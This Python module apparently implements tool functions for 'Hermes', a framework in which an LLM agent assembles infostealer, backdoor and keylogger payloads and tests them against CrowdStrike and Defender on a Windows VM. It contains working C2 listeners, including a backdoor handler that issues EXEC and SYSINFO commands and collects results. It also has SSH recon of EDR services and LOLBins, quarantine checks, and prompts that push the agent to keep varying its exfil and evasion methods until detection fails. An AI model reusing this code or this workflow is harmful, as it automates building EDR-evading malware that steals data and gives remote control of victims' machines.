"""Tool implementations for the Hermes orchestrator.

Each tool is an async method on ToolExecutor. The orchestrator dispatches
tool_calls from the LLM to ToolExecutor.execute(name, args) which routes
to the corresponding tool_<name> method.
"""

import asyncio
import logging
import os
import socket
import struct
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import paramiko
import yaml

from .classifier import classify_failure
from .knowledge_db import KnowledgeDB
from .strategy import StrategyTree

logger = logging.getLogger(__name__)

_c2_listeners: dict[int, dict] = {}
_c2_servers: dict[int, HTTPServer | socket.socket] = {}
_c2_locks: dict[int, threading.Lock] = {}
_c2_stop_events: dict[int, threading.Event] = {}

CMD_HEARTBEAT = 0x01
CMD_SYSINFO = 0x02
CMD_PROCESSES = 0x03
CMD_EXEC = 0x0A
CMD_EXIT = 0x0D
CMD_NOOP = 0xFF

CMD_NAMES = {0x01: "HEARTBEAT", 0x02: "SYSINFO", 0x03: "PROCESSES",
             0x0A: "EXEC", 0x0D: "EXIT", 0xFF: "NOOP"}

_BACKDOOR_TEST_COMMANDS = [
    (CMD_SYSINFO, b""),
    (CMD_PROCESSES, b""),
    (CMD_EXEC, b"whoami /priv"),
    (CMD_EXIT, b""),
]


# ── C2 listener infrastructure ──────────────────────────────────────


class _C2HTTPHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        port = self.server.server_address[1]
        lock = _c2_locks.get(port)
        if lock:
            with lock:
                entry = _c2_listeners[port]
                entry["data"] += body
                entry["requests"] += 1
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        logger.debug("C2 HTTP: %s", format % args)


class _ReusableHTTPServer(HTTPServer):
    allow_reuse_address = True


def _run_http_c2(port: int, timeout: int):
    try:
        server = _ReusableHTTPServer(("0.0.0.0", port), _C2HTTPHandler)
    except OSError as e:
        logger.error("C2 HTTP bind failed on port %d: %s — force-killing port holder", port, e)
        import subprocess
        subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True, timeout=5)
        time.sleep(1)
        try:
            server = _ReusableHTTPServer(("0.0.0.0", port), _C2HTTPHandler)
        except OSError as e2:
            logger.error("C2 HTTP bind retry failed on port %d: %s", port, e2)
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            return
    server.timeout = 1
    _c2_servers[port] = server
    stop_event = _c2_stop_events.get(port)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if stop_event and stop_event.is_set():
            break
        server.handle_request()
    server.server_close()
    _c2_servers.pop(port, None)


def _run_tcp_c2(port: int, timeout: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", port))
    except OSError as e:
        logger.error("C2 TCP bind failed on port %d: %s — force-killing port holder", port, e)
        sock.close()
        import subprocess
        subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True, timeout=5)
        time.sleep(1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(("0.0.0.0", port))
        except OSError as e2:
            logger.error("C2 TCP bind retry failed on port %d: %s", port, e2)
            sock.close()
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            return
    sock.listen(5)
    sock.settimeout(1.0)
    _c2_servers[port] = sock
    stop_event = _c2_stop_events.get(port)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if stop_event and stop_event.is_set():
            break
        try:
            conn, addr = sock.accept()
            conn.settimeout(10)
            data = b""
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                data += chunk
            conn.close()
            lock = _c2_locks.get(port)
            if lock:
                with lock:
                    entry = _c2_listeners[port]
                    entry["data"] += data
                    entry["requests"] += 1
        except socket.timeout:
            continue
        except OSError:
            break
    sock.close()
    _c2_servers.pop(port, None)


class _BackdoorC2Handler(BaseHTTPRequestHandler):
    """TLV-aware C2 for backdoors: sends test commands on /beacon, collects results on /result."""

    test_commands = []
    test_idx = 0
    beacon_count = 0
    results = []
    handler_lock = threading.Lock()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        port = self.server.server_address[1]

        if self.path == "/beacon":
            with _BackdoorC2Handler.handler_lock:
                _BackdoorC2Handler.beacon_count += 1
                if _BackdoorC2Handler.test_idx < len(_BackdoorC2Handler.test_commands):
                    cmd_id, arg = _BackdoorC2Handler.test_commands[_BackdoorC2Handler.test_idx]
                    _BackdoorC2Handler.test_idx += 1
                    resp = struct.pack("<II", cmd_id, len(arg)) + arg
                else:
                    resp = struct.pack("<II", CMD_NOOP, 0)

            self.send_response(200)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)

            lock = _c2_locks.get(port)
            if lock:
                with lock:
                    entry = _c2_listeners[port]
                    entry["requests"] += 1

        elif self.path == "/result":
            if len(body) >= 8:
                cmd_id, plen = struct.unpack("<II", body[:8])
                payload = body[8:8+plen] if plen > 0 else b""
                text = payload.decode("utf-8", errors="replace")
                with _BackdoorC2Handler.handler_lock:
                    _BackdoorC2Handler.results.append((cmd_id, text))

                lock = _c2_locks.get(port)
                if lock:
                    with lock:
                        entry = _c2_listeners[port]
                        entry["data"] += body
                        entry["requests"] += 1
                        if "backdoor_results" not in entry:
                            entry["backdoor_results"] = []
                        entry["backdoor_results"].append({
                            "cmd": CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}"),
                            "size": len(payload),
                            "preview": text[:500],
                        })

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        logger.debug("Backdoor C2: %s", fmt % args)


def _run_backdoor_c2(port: int, timeout: int):
    """Dual-protocol backdoor C2: tries HTTP first, falls back to raw TCP TLV.

    Accepts the first connection and peeks at the first bytes:
    - If they start with a valid HTTP method (GET/POST), handle as HTTP (winhttp_beacon)
    - If they start with TLV binary data, handle as raw TCP (tcp_beacon)
    """
    test_commands = list(_BACKDOOR_TEST_COMMANDS)
    beacon_count = 0
    result_count = 0
    results_list: list[dict] = []
    lock_obj = _c2_locks.get(port)

    def _record(beacons, results, res_list):
        if lock_obj:
            with lock_obj:
                entry = _c2_listeners[port]
                entry["backdoor_beacons"] = beacons
                entry["backdoor_result_count"] = results
                entry["backdoor_results"] = res_list

    def _handle_tcp_tlv(conn: socket.socket):
        nonlocal beacon_count, result_count, results_list
        conn.settimeout(15)
        cmd_idx = 0
        try:
            while True:
                hdr = b""
                while len(hdr) < 8:
                    chunk = conn.recv(8 - len(hdr))
                    if not chunk:
                        return
                    hdr += chunk
                cmd_id, plen = struct.unpack("<II", hdr)
                payload = b""
                while len(payload) < plen:
                    chunk = conn.recv(plen - len(payload))
                    if not chunk:
                        return
                    payload += chunk

                if cmd_id == CMD_HEARTBEAT:
                    beacon_count += 1
                    if lock_obj:
                        with lock_obj:
                            _c2_listeners[port]["requests"] += 1
                    if cmd_idx < len(test_commands):
                        tcmd, targ = test_commands[cmd_idx]
                        cmd_idx += 1
                        resp = struct.pack("<II", tcmd, len(targ)) + targ
                    else:
                        resp = struct.pack("<II", CMD_NOOP, 0)
                    conn.sendall(resp)
                else:
                    text = payload.decode("utf-8", errors="replace")
                    result_count += 1
                    results_list.append({
                        "cmd": CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}"),
                        "size": len(payload),
                        "preview": text[:500],
                    })
                    if lock_obj:
                        with lock_obj:
                            entry = _c2_listeners[port]
                            entry["data"] += hdr + payload
                            entry["requests"] += 1
                    if cmd_idx >= len(test_commands) and result_count >= 3:
                        break
        except (socket.timeout, OSError) as e:
            logger.debug("TCP TLV backdoor session ended: %s", e)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", port))
    except OSError as e:
        logger.error("C2 Backdoor bind failed on port %d: %s — force-killing", port, e)
        sock.close()
        import subprocess
        subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True, timeout=5)
        time.sleep(1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind(("0.0.0.0", port))
        except OSError as e2:
            logger.error("C2 Backdoor bind retry failed on port %d: %s", port, e2)
            sock.close()
            _c2_listeners.pop(port, None)
            _c2_locks.pop(port, None)
            return
    sock.listen(5)
    sock.settimeout(1.0)
    _c2_servers[port] = sock
    stop_event = _c2_stop_events.get(port)
    deadline = time.monotonic() + timeout

    while time.monotonic() < deadline:
        if stop_event and stop_event.is_set():
            break
        try:
            conn, addr = sock.accept()
            conn.settimeout(5)
            logger.info("Backdoor C2: connection from %s:%d", addr[0], addr[1])
        except socket.timeout:
            continue
        except OSError:
            break

        try:
            peek = conn.recv(8, socket.MSG_PEEK)
        except (socket.timeout, OSError):
            conn.close()
            continue

        if peek and peek[:4] in (b"GET ", b"POST", b"PUT ", b"HEAD"):
            logger.info("Backdoor C2: HTTP detected, handing off to HTTP handler")
            conn.close()
            sock.close()
            _c2_servers.pop(port, None)
            _BackdoorC2Handler.test_commands = test_commands
            _BackdoorC2Handler.test_idx = 0
            _BackdoorC2Handler.beacon_count = beacon_count
            _BackdoorC2Handler.results = []
            try:
                server = _ReusableHTTPServer(("0.0.0.0", port), _BackdoorC2Handler)
            except OSError:
                _record(beacon_count, result_count, results_list)
                return
            server.timeout = 1
            _c2_servers[port] = server
            remaining = deadline - time.monotonic()
            while time.monotonic() < deadline:
                if stop_event and stop_event.is_set():
                    break
                server.handle_request()
                with _BackdoorC2Handler.handler_lock:
                    if (_BackdoorC2Handler.test_idx >= len(_BackdoorC2Handler.test_commands)
                            and len(_BackdoorC2Handler.results) >= 3):
                        server.handle_request()
                        break
            server.server_close()
            _c2_servers.pop(port, None)
            beacon_count += _BackdoorC2Handler.beacon_count
            result_count += len(_BackdoorC2Handler.results)
            for cmd_id, text in _BackdoorC2Handler.results:
                results_list.append({
                    "cmd": CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}"),
                    "size": len(text),
                    "preview": text[:500],
                })
            _record(beacon_count, result_count, results_list)
            return
        else:
            logger.info("Backdoor C2: raw TCP TLV detected")
            _handle_tcp_tlv(conn)
            conn.close()
            if result_count >= 3:
                break

    sock.close()
    _c2_servers.pop(port, None)
    _record(beacon_count, result_count, results_list)


# ── ToolExecutor ─────────────────────────────────────────────────────
# Tool definitions (JSON schemas for the LLM) live in prompts.py.
# This module implements the actual tool functions.


class ToolExecutor:
    """Executes Hermes tool calls against the real environment."""

    def __init__(self, config: dict):
        self.config = config
        self.vm_host = config.get("vm_host", "localhost")
        self.vm_port = config.get("vm_port", 10022)
        self.vm_user = config.get("vm_user", "vmuser")
        self.vm_pass = config.get("vm_pass", "vmuser123")
        self.assembler_path = config.get(
            "assembler_path",
            str(Path(__file__).parent.parent / "templates" / "chunks" / "assembler.py"),
        )
        self.chunks_dir = config.get(
            "chunks_dir",
            str(Path(__file__).parent.parent / "templates" / "chunks"),
        )
        self.recipes_dir = config.get(
            "recipes_dir",
            str(Path(__file__).parent.parent / "templates" / "chunks" / "recipes"),
        )
        self.results_dir = config.get(
            "results_dir",
            str(Path(__file__).parent.parent / "results"),
        )
        self._last_recipe = ""
        self._last_exfil = ""
        self._current_edr = config.get("edr", "unknown")
        self._quarantined_hashes: set[str] = set()
        self._quarantine_streak = 0
        self._last_assembled_recipe = ""
        self._last_output_dir = ""
        self._failed_obfusc: set[tuple[str, str]] = set()
        self._recipe_lineage: dict[str, dict] = {}
        self._stock_recipes: set[str] = set()
        self._blind_mode: bool = config.get("blind_mode", False)
        self._blind_name_map: dict[str, str] = {}
        self._epoch_call_count = 0
        self._epoch_number = 1
        self._epoch_failures: list[str] = []
        self._epoch_soft_limit = 30
        self._epoch_hard_limit = 40
        self._all_epoch_summaries: list[str] = []
        self._meta_epoch_interval = 10
        self._quarantine_locked = False
        self._load_stock_recipes()

    @property
    def _is_backdoor(self) -> bool:
        """Detect backdoor mission from config OR recipe name."""
        if self.config.get("_target_malware_type", "") == "backdoor":
            return True
        if self._last_recipe and "backdoor" in self._last_recipe:
            return True
        return False

    @property
    def _is_persistent_type(self) -> bool:
        """Detect persistent malware types (backdoor, keylogger) from config OR recipe name."""
        mt = self.config.get("_target_malware_type", "")
        if mt in ("backdoor", "keylogger"):
            return True
        if self._last_recipe and any(k in self._last_recipe for k in ("backdoor", "keylogger", "persist")):
            return True
        return False

    @staticmethod
    def _truncate(text: str, max_chars: int, label: str = "output") -> str:
        if len(text) <= max_chars:
            return text
        half = max_chars // 2
        removed = len(text) - max_chars
        return text[:half] + f"\n\n... [{removed} chars truncated from {label}] ...\n\n" + text[-half:]

    @staticmethod
    def _sanitize_recipe_name(name: str) -> str:
        import re
        leak_words = r"_?(proven|fud|working|stealth|pass|bypass|edr|evasion|undetected)"
        sanitized = re.sub(leak_words, "", name, flags=re.IGNORECASE)
        sanitized = re.sub(r"_cs(?=_|$)", "", sanitized)
        sanitized = re.sub(r"_crowdstrike(?=_|$)", "", sanitized)
        sanitized = re.sub(r"_{2,}", "_", sanitized).strip("_")
        return sanitized

    def _load_stock_recipes(self):
        """Snapshot existing recipe names at init — anything here is 'stock'."""
        recipes_path = Path(self.recipes_dir)
        if recipes_path.exists():
            self._stock_recipes = {
                f.stem for f in recipes_path.glob("*.yaml")
            }

    def get_recipe_origin(self, recipe_name: str) -> str:
        """Classify a recipe's origin for success reporting."""
        name = recipe_name.replace(".yaml", "")
        lineage = self._recipe_lineage.get(name, {})
        if not lineage:
            if name in self._stock_recipes:
                return "EXISTING — stock recipe with randomization/obfuscation"
            return "EXISTING — stock recipe with randomization/obfuscation"
        if lineage.get("created_new"):
            return "NEW — created from scratch during this campaign"
        mutation_depth = lineage.get("mutation_depth", 0)
        parent = lineage.get("original_parent", name)
        if mutation_depth >= 3:
            return f"NEW — evolved beyond recognition ({mutation_depth} mutations from {parent})"
        return f"MUTATED — derived from {parent} ({mutation_depth} mutation{'s' if mutation_depth != 1 else ''})"

    def _build_epoch_reset(self) -> str:
        """Build an epoch reset message summarizing failures and forcing a new approach."""
        epoch_summary = []
        seen = set()
        for f in self._epoch_failures:
            if f not in seen:
                epoch_summary.append(f)
                seen.add(f)

        summary_lines = [
            f"\n\n{'='*60}",
            f"⚠️  EPOCH {self._epoch_number} ENDED — {len(self._epoch_failures)} failed attempts",
            f"{'='*60}",
            "",
            "## What failed this epoch:",
        ]
        for f in epoch_summary:
            summary_lines.append(f"  - {f}")

        self._all_epoch_summaries.append(
            f"Epoch {self._epoch_number}: {len(self._epoch_failures)} failures — "
            + "; ".join(epoch_summary[:5])
        )

        if self._epoch_number > 0 and self._epoch_number % self._meta_epoch_interval == 0:
            summary_lines.extend([
                "",
                f"{'#'*60}",
                f"## META-REVIEW: {self._epoch_number} epochs completed, still no success",
                f"{'#'*60}",
                "",
                "## Full history of all epochs:",
            ])
            for s in self._all_epoch_summaries:
                summary_lines.append(f"  - {s}")
            summary_lines.extend([
                "",
                "## Decision point — choose ONE:",
                "1. **GO DEEPER**: Pick the epoch that got CLOSEST to success (most C2 bytes, "
                "   fewest detections) and refine that specific approach with targeted changes.",
                "2. **TRY NEW**: If every epoch failed the same way, the problem might be "
                "   fundamental to your format/type combo. Try a radically different architecture "
                "   (different exfil protocol, different execution model, different collector set).",
                "3. **SIMPLIFY**: Strip the recipe to minimum viable (1 collector, basic exfil, "
                "   no evasion) and verify the skeleton works before adding complexity.",
                "",
                "State which option you're choosing and WHY, then act on it.",
                f"{'#'*60}",
            ])
        else:
            summary_lines.extend([
                "",
                "## MANDATORY RESET",
                "You MUST now take a COMPLETELY DIFFERENT approach:",
                "- Do NOT mutate any recipe from this epoch",
                "- Do NOT reuse the same base architecture or evasion combination",
                "- Call list_chunks again and pick DIFFERENT chunks",
                "- Try a different arch, different exfil method, different evasion set",
                "- Create a brand new recipe with create_recipe",
                f"- This is epoch {self._epoch_number + 1} — make it count",
            ])

        summary_lines.append(f"{'='*60}")
        self._epoch_number += 1
        self._epoch_call_count = 0
        self._epoch_failures.clear()
        logger.info("Epoch reset triggered — now epoch %d", self._epoch_number)
        return "\n".join(summary_lines)

    def _check_epoch_soft_limit(self) -> str:
        """At the soft limit, nudge the LLM to consider pivoting."""
        return (
            f"\n\n--- NOTE: You have made {self._epoch_call_count} tool calls this epoch "
            f"with {len(self._epoch_failures)} failures. "
            f"If you're confident your next attempt will work, continue. "
            f"Otherwise, consider summarizing what failed and trying a completely "
            f"different approach (different arch, exfil, evasion combination). "
            f"Hard reset in {self._epoch_hard_limit - self._epoch_call_count} calls. ---"
        )

    async def execute(self, tool_name: str, arguments: dict) -> str:
        handler = getattr(self, f"tool_{tool_name}", None)
        if handler is None:
            return f"ERROR: Unknown tool '{tool_name}'"
        try:
            result = await handler(**arguments)
        except Exception as e:
            logger.exception("Tool %s failed", tool_name)
            result = f"ERROR: {tool_name} failed: {e}"

        self._epoch_call_count += 1

        if self._epoch_call_count >= self._epoch_hard_limit:
            result += self._build_epoch_reset()
        elif self._epoch_call_count == self._epoch_soft_limit:
            result += self._check_epoch_soft_limit()

        return result

    # ── SSH / SCP helpers ────────────────────────────────────────────

    def _get_ssh_client(self) -> paramiko.SSHClient:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=self.vm_host,
            port=self.vm_port,
            username=self.vm_user,
            password=self.vm_pass,
            timeout=15,
            allow_agent=False,
            look_for_keys=False,
        )
        return client

    async def _ssh_exec(self, command: str, timeout: int = 30) -> tuple[str, str, int]:
        def _run():
            try:
                client = self._get_ssh_client()
            except Exception as e:
                return "", f"SSH connect failed: {e}", -1
            try:
                _, stdout_ch, stderr_ch = client.exec_command(
                    f"cmd /c {command}", timeout=timeout
                )
                out = stdout_ch.read().decode("utf-8", errors="replace").replace("\r", "")
                err = stderr_ch.read().decode("utf-8", errors="replace").replace("\r", "")
                rc = stdout_ch.channel.recv_exit_status()
                return out, err, rc
            except Exception as e:
                return "", f"SSH exec error: {e}", -1
            finally:
                client.close()
        return await asyncio.get_event_loop().run_in_executor(None, _run)

    async def _scp_to_vm(self, local_path: str, remote_filename: str,
                         remote_dir: str | None = None) -> bool:
        if remote_dir:
            remote_full = f"{remote_dir}/{remote_filename}"
        else:
            remote_full = f"C:/Users/{self.vm_user}/Desktop/{remote_filename}"
        def _upload():
            try:
                client = self._get_ssh_client()
                sftp = client.open_sftp()
                sftp.put(local_path, remote_full)
                sftp.close()
                client.close()
                return True
            except Exception as e:
                logger.error("SFTP upload failed: %s", e)
                return False
        return await asyncio.get_event_loop().run_in_executor(None, _upload)

    # ── Reconnaissance ───────────────────────────────────────────────

    async def tool_scan_target(self) -> str:
        logger.info("Scanning target VM")

        sysinfo_out, sysinfo_err, sysinfo_rc = await self._ssh_exec("systeminfo", timeout=60)
        if sysinfo_rc == -1:
            return (
                f"ERROR: VM unreachable — SSH connection to {self.vm_host}:{self.vm_port} failed. "
                f"Detail: {sysinfo_err}. "
                f"The VM may be down or rebooting. Wait and retry, or call cleanup_vm to attempt a restart."
            )

        av_out, _, _ = await self._ssh_exec(
            "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list",
            timeout=15,
        )

        cs_out, _, _ = await self._ssh_exec("sc query csfalconservice", timeout=10)
        cs_status = "RUNNING" if "RUNNING" in cs_out else "NOT_FOUND"

        wd_out, _, _ = await self._ssh_exec("sc query windefend", timeout=10)
        wd_status = "RUNNING" if "RUNNING" in wd_out else "STOPPED"

        ip_out, _, _ = await self._ssh_exec("ipconfig", timeout=10)

        lolbins = {}
        for tool in ["certutil", "curl", "bitsadmin", "cscript", "mshta", "wscript"]:
            out, _, rc = await self._ssh_exec(f"where {tool}", timeout=5)
            lolbins[tool] = out.strip().split("\n")[0] if rc == 0 and out.strip() else "not found"

        os_name = ""
        hostname = ""
        for line in sysinfo_out.split("\n"):
            stripped = line.strip()
            if stripped.startswith("OS Name:"):
                os_name = stripped.split(":", 1)[1].strip()
            elif stripped.startswith("Host Name:"):
                hostname = stripped.split(":", 1)[1].strip()

        edr = "none"
        if cs_status == "RUNNING":
            edr = "crowdstrike"
        elif wd_status == "RUNNING":
            edr = "defender"
        self._current_edr = edr

        lines = [
            f"OS: {os_name}",
            f"Hostname: {hostname}",
            f"EDR: {edr}",
            f"CrowdStrike: {cs_status}",
            f"Defender: {wd_status}",
            f"Antivirus: {av_out.strip() or 'none detected'}",
            "LOLBins:",
        ]
        for tool, path in lolbins.items():
            lines.append(f"  {tool}: {path}")
        lines.append(f"\nNetwork:\n{ip_out[:500]}")

        return "\n".join(lines)

    async def tool_list_edr_events(self, minutes: int = 10) -> str:
        logger.info("Checking EDR events (last %d min)", minutes)
        sections = []

        defender_out, _, _ = await self._ssh_exec(
            f'powershell -c "Get-MpThreatDetection | '
            f'Where-Object {{ $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-{minutes}) }} | '
            f'Select-Object -First 5 | Format-List"',
            timeout=20,
        )
        sections.append(f"=== Defender Threat Detections ===\n{defender_out.strip() or '(none)'}")

        evtlog_out, _, _ = await self._ssh_exec(
            'wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /c:10 /f:text /rd:true',
            timeout=20,
        )
        sections.append(f"=== Defender Event Log ===\n{evtlog_out.strip()[:2000] or '(none)'}")

        cs_queries = [
            (
                "CrowdStrike Operational Log",
                'powershell -c "'
                "$logs = @("
                "'CrowdStrike Falcon/Operational',"
                "'CrowdStrike Falcon Sensor/Operational',"
                "'Application'"
                "); "
                "foreach ($log in $logs) { "
                "try { Get-WinEvent -LogName $log -MaxEvents 10 -ErrorAction Stop | "
                "Where-Object { $_.ProviderName -like '*CrowdStrike*' -or $_.ProviderName -like '*Falcon*' -or $_.ProviderName -like '*CSAgent*' } | "
                'Format-List TimeCreated, Id, ProviderName, Message } catch {} }"'
            ),
            (
                "CrowdStrike Quarantine",
                'powershell -c "'
                "$qDirs = @("
                "'C:\\ProgramData\\CrowdStrike\\Quarantine',"
                "'C:\\Windows\\System32\\drivers\\CrowdStrike\\Quarantine',"
                "'C:\\ProgramData\\CrowdStrike'"
                "); "
                "foreach ($d in $qDirs) { "
                "if (Test-Path $d) { "
                "Get-ChildItem $d -Recurse -File -ErrorAction SilentlyContinue | "
                f"Where-Object {{ $_.LastWriteTime -gt (Get-Date).AddMinutes(-{minutes}) }} | "
                'Sort-Object LastWriteTime -Descending | Select-Object -First 10 | '
                'Format-Table Name, Length, LastWriteTime -AutoSize } }"'
            ),
            (
                "CrowdStrike Sensor Status",
                'powershell -c "'
                "Get-Service csagent, CSFalconService -ErrorAction SilentlyContinue | "
                'Format-Table Name, Status, StartType -AutoSize"'
            ),
        ]

        for label, cmd in cs_queries:
            try:
                out, _, _ = await self._ssh_exec(cmd, timeout=20)
                out = out.strip()
                if out:
                    sections.append(f"=== {label} ===\n{out[:2000]}")
            except Exception as e:
                logger.debug("CS query '%s' failed: %s", label, e)

        return "\n\n".join(sections)

    # ── Planning ─────────────────────────────────────────────────────

    def _load_recipe_results(self) -> dict[str, list[dict]]:
        """Load recipe_results.json and index by recipe name."""
        if self._blind_mode:
            return {}
        rr_path = Path(self.recipes_dir).parent.parent.parent / "results" / "recipe_results.json"
        by_recipe: dict[str, list[dict]] = {}
        try:
            import json
            data = json.loads(rr_path.read_text())
            for r in data.get("results", []):
                by_recipe.setdefault(r["recipe"], []).append(r)
        except Exception:
            pass
        return by_recipe

    async def tool_list_recipes(self, format_filter: str = "", type_filter: str = "") -> str:
        logger.info("Listing recipes (format=%s, type=%s)", format_filter or "all", type_filter or "all")

        if self._blind_mode:
            return ("BLIND MODE: Recipe list is not available. "
                    "Use list_chunks to discover available chunks, then create_recipe to build your own.\n\n"
                    "Recipe structure reference:\n"
                    "  core: [core/emit_buffer, core/run_cmd, core/file_ops]\n"
                    "  collectors: [collectors/<name>, ...]\n"
                    "  exfil: exfil/<method>\n"
                    "  arch: arch/<style>\n"
                    "  evasion: [evasion/<technique>, ...]\n"
                    "  vars: {C2_IP: <ip>, C2_PORT: <port>}")

        recipes_path = Path(self.recipes_dir)
        if not recipes_path.exists():
            return "ERROR: Recipes directory not found"

        type_prefixes = {
            "infostealer": ("infostealer_", "js_infostealer_", "bat_infostealer_", "vbs_infostealer_"),
            "backdoor": ("backdoor_", "js_backdoor_", "bat_backdoor_", "vbs_backdoor_"),
            "keylogger": ("keylogger_", "js_keylogger_", "bat_keylogger_", "vbs_keylogger_"),
        }

        recipe_history = self._load_recipe_results()
        results = []
        script_formats = {"jscript", "vbscript", "batch"}
        for yf in sorted(recipes_path.glob("*.yaml")):
            name = yf.stem

            if type_filter and type_filter in type_prefixes:
                if not any(name.startswith(p) for p in type_prefixes[type_filter]):
                    continue

            if format_filter and format_filter != "auto":
                with open(yf) as fh:
                    data = yaml.safe_load(fh)
                recipe_fmt = data.get("format", "")
                if format_filter in script_formats:
                    if recipe_fmt != format_filter:
                        continue
                elif format_filter in ("pe", "c"):
                    if recipe_fmt in script_formats:
                        continue

            display_name = name
            history = recipe_history.get(name, [])
            if history:
                latest = history[-1]
                tag = f" [{latest['verdict']}@{latest.get('edr','?')}]"
            else:
                tag = ""
            results.append(f"{display_name}{tag}")

        header = f"Recipes ({len(results)})"
        if recipe_history:
            passes = sum(1 for recs in recipe_history.values() for r in recs if r["verdict"] == "PASS")
            fails = sum(1 for recs in recipe_history.values() for r in recs if "FAIL" in r["verdict"])
            header += f" — {passes} proven PASS, {fails} known FAIL"
        output = f"{header}:\n" + "\n".join(f"  - {r}" for r in results)
        return self._truncate(output, 2000, "list_recipes")

    @staticmethod
    def _parse_chunk_meta(filepath: Path) -> dict:
        """Extract provides/depends/note from chunk header comments."""
        meta = {}
        comment_chars = {"//": (".c", ".h", ".js"), "'": (".vbs",), "REM": (".bat",)}
        prefix = None
        for chars, exts in comment_chars.items():
            if filepath.suffix in exts:
                prefix = chars
                break
        if not prefix:
            return meta
        try:
            with open(filepath, "r", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line.startswith(prefix):
                        break
                    rest = line[len(prefix):].strip()
                    for key in ("provides:", "depends:", "note:", "description:"):
                        if rest.lower().startswith(key):
                            val = rest[len(key):].strip()
                            meta[key.rstrip(":")] = val
                            break
        except OSError:
            pass
        return meta

    async def tool_list_chunks(self, category: str, format_filter: str = "") -> str:
        logger.info("Listing chunks in %s (format=%s)", category, format_filter or "all")

        fmt_dir = ""
        if format_filter:
            fmt_map = {"jscript": "jscript", "vbscript": "vbscript", "batch": "batch",
                       "pe": "", "c": "", "auto": ""}
            fmt_dir = fmt_map.get(format_filter, "")

        def _list_cat(cat_path: Path) -> list[str]:
            entries = []
            for entry in sorted(cat_path.iterdir()):
                if entry.is_file() and entry.suffix in (".c", ".h", ".js", ".vbs", ".bat"):
                    ref = f"{cat_path.name}/{entry.stem}"
                    meta = self._parse_chunk_meta(entry)
                    desc = meta.get("note") or meta.get("description") or ""
                    provides = meta.get("provides", "")
                    parts = [f"  - {ref}"]
                    if provides:
                        parts.append(f"[provides: {provides}]")
                    if desc:
                        parts.append(f"— {desc[:80]}")
                    entries.append(" ".join(parts))
            return entries

        if category == "all":
            base = Path(self.chunks_dir) / fmt_dir if fmt_dir else Path(self.chunks_dir)
            lines = []
            total = 0
            for cat_path in sorted(base.iterdir()):
                if not cat_path.is_dir() or cat_path.name.startswith(".") or cat_path.name in ("recipes", "__pycache__"):
                    continue
                entries = _list_cat(cat_path)
                if entries:
                    total += len(entries)
                    lines.append(f"\n{cat_path.name} ({len(entries)}):")
                    lines.extend(entries)
            output = (f"All chunks ({total})"
                     + (f" for {format_filter}" if format_filter else "")
                     + ":" + "\n".join(lines)
                     + "\n\nALWAYS use 'category/name' format in recipes.")
            return self._truncate(output, 6000, "list_chunks")

        base = Path(self.chunks_dir) / fmt_dir if fmt_dir else Path(self.chunks_dir)
        cat_path = base / category
        if not cat_path.exists():
            cats = sorted(p.name for p in base.iterdir()
                         if p.is_dir() and not p.name.startswith(".") and p.name not in ("recipes", "__pycache__"))
            return f"ERROR: Category '{category}' not found. Available: {', '.join(cats)}"

        entries = _list_cat(cat_path)
        output = (f"Chunks in {category} ({len(entries)})"
                  + (f" for {format_filter}" if format_filter else "")
                  + ":\n" + "\n".join(entries)
                  + f"\n\nALWAYS use the full 'category/name' format in recipes.")
        return self._truncate(output, 6000, "list_chunks")

    async def tool_get_strategy(self, edr: str) -> str:
        logger.info("Getting strategy for EDR: %s", edr)
        if self._blind_mode:
            return (f"Strategy for {edr}:\n\nBLIND MODE: No pre-built strategy available. "
                    "Use list_chunks to see evasion options, pick a recipe, and iterate based on results.")
        tree = StrategyTree()
        return tree.summary(edr)

    async def tool_query_knowledge(self, edr: str, malware_type: str = "") -> str:
        logger.info("Querying knowledge for %s / %s", edr, malware_type or "all")
        if self._blind_mode:
            return (f"Knowledge DB -- {edr}" + (f" / {malware_type}" if malware_type else "") +
                    "\n\nBLIND MODE: No prior results available. "
                    "You must discover working recipes from scratch using available chunks and evasion techniques.")
        db = KnowledgeDB.load()
        lines = [f"Knowledge DB -- {edr}" + (f" / {malware_type}" if malware_type else "")]

        if malware_type:
